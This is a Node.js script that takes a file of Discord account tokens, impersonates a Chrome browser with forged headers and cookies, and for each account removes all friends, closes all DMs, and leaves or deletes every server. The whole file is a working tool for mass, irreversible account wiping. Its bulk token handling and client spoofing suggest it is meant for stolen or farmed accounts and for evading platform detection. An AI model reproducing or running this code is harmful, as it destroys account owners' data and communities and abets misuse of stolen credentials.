// Npm packages
const lineReader = require("line-reader");
const fetch = require('node-fetch');
const fetcher = require("discord-build-fetcher-js");
const colors = require('colors');
Promise = require("bluebird"); 
 
const tokens = []; 
 
var eachLine = Promise.promisify(lineReader.eachLine); 

// Gets all the tokens in tokens.txt and puts them in an array
const getTokens = async () => { 
    await eachLine("./tokens.txt", (line) => { 
        tokens.push(line); 
    }); 
 
    return tokens; 
}; 

const createHeaders = async (token) => {
    const getCookies = await fetch("https://discord.com/", {
        method: "GET",
        headers: {
            "authority": 'discord.com',
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-CA,en;q=0.9',
            'dnt': '1',
            'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36'
        }
    });

    const build_info = await fetcher('stable');
    const build_num = build_info['buildNum'];
    const dcfduid = JSON.stringify(getCookies.headers.get('set-cookie')).split('__dcfduid=')[1].split(';')[0];
    const sdcfduid = JSON.stringify(getCookies.headers.get('set-cookie')).split('__sdcfduid=')[1].split(';')[0];

    const superProps = Buffer.from(JSON.stringify({        
        "os":"Windows",
        "browser":"Chrome",
        "device":"",
        "system_locale":"en-CA",
        "browser_user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36",
        "browser_version":"101.0.4951.67",
        "os_version":"10",
        "referrer":"",
        "referring_domain":"",
        "referrer_current":"",
        "referring_domain_current":"",
        "release_channel":"stable",
        "client_build_number": build_num,
        "client_event_source":null
    })).toString('base64');

    return {
        'authority': 'discord.com',
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-CA,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
        'authorization': token,
        'cookie': `__dcfduid=${dcfduid}; __sdcfduid=${sdcfduid};`,
        'dnt': '1',
        'referer': 'https://discord.com/login',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': "Windows",
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36',
        'x-debug-options': 'bugReporterEnabled',
        'x-discord-locale': 'en-US',
        'x-super-properties': superProps
    };
};

const removeFriends = async (headers) => {
    let friendIds = await fetch('https://discord.com/api/v9/users/@me/relationships', {
        method: "GET",
        headers: headers
    });

    for (const [key, value] of Object.entries(await friendIds.json())) {
        await fetch(`https://discord.com/api/v9/users/@me/relationships/${value['id']}`, {
            headers: headers,
            method: "DELETE"
        })
            .then((res) => {
                if (res.status !== 204) {
                    console.log(`Failed to remove friend ${value['id']} [${key}]`.red)
                } else {
                    console.log(`Removed friend ${value['id']} [${key}]`.green)
                }
            });
    }

};

const removeDms = async (headers) => {
    let dmIds = await fetch('https://discord.com/api/v9/users/@me/channels', {
        method: "GET",
        headers: headers
    });
    for (const [key, value] of Object.entries(await dmIds.json())) {
        await fetch(`https://discord.com/api/v9/channels/${value['id']}`, {
            headers: headers,
            method: "DELETE"
        })
            .then((res) => {
                if (res.status !== 200) {
                    console.log(`Failed to close dm ${value['id']} [${key}]`.red);
                } else {
                    console.log(`Closed dm ${value['id']} [${key}]`.green);
                }
            });
    }
}

const removeServers = async (headers) => {
    let guildIds = await fetch('https://discord.com/api/v9/users/@me/guilds', {
        method: "GET",
        headers: headers,
    });
    for (const [key, value] of Object.entries(await guildIds.json())) {
        let leaveServer = await fetch(`https://discord.com/api/v9/users/@me/guilds/${value['id']}`, {
            method: "DELETE",
            headers: headers
        });

        if (leaveServer.status !== 204) {
            await fetch(`https://discord.com/api/v9/guilds/${value['id']}/delete`, {
                method: "POST",
                headers: headers
            })
                .then((res) => {
                    if (res.status !== 204) {
                        console.log(`Failed to delete ${value['id']} [${key}]`.red);
                    } else {
                        console.log(`Deleted ${value['id']} [${key}]`.green);
                        return false;
                    }
                });
        } else {
            console.log(`Left ${value['id']} [${key}]`.green);
        }
    }
}


const checkToken = async (headers) => {
    const response = await fetch(
        "https://discord.com/api/v9/users/@me/library",
        {
            headers: headers,
            method: "GET",
    });

    return response.status;
}



// Automatic calling async function to be able to call other async functions
(async () => {
    console.clear();
    await getTokens();
    for (i = 0; i < tokens.length; i++) {
        const tokenToClean = tokens[i]
        const headers = await createHeaders(tokenToClean);

        // Checks token if it is locked
        switch (await checkToken(headers)) {
            case 200:
                break;
            default:
                console.log(`Token Locked: ${tokenToClean} [${i}]`.red);
                continue;
        }

        await removeFriends(headers);
        await removeDms(headers);
        await removeServers(headers);
    }
})();
